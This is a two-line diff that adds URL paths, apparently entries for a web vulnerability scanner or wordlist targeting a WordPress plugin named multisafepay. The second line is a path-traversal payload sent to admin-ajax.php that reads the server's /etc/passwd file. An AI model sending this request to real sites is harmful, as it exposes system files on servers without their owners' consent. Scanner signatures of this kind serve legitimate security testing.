@@ -1,0 +1,2 @@
+/wp-content/plugins/multisafepay/readme.txt
+/wp-admin/admin-ajax.php?action=admin_init&log_filename=../../../../../../../../../../../../../etc/passwd
